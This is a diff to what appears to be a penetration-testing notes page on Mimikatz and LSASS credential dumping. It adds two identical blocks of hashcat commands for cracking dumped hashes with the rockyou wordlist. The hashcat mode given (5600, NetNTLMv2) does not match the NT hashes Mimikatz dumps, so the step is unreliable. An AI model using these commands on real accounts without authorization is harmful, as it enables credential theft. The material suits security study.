@@ -348,6 +348,15 @@ Mimikatz lists a lot of information about accounts and machines. If we check clo
 
 Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.
 
+Grab the NTLM hashes to decrypt
+
+**Kali**
+
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
+```
+
 ### Protected LSASS
 
 **Example**
@@ -442,6 +451,15 @@ sekurlsa::logonpasswords
 ```
 
 <figure><img src="../../.gitbook/assets/image (120) (1).png" alt=""><figcaption></figcaption></figure>
+
+Grab the NTLM hashes to decrypt
+
+**Kali**
+
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
+```
 
 ## Windows Cred
 
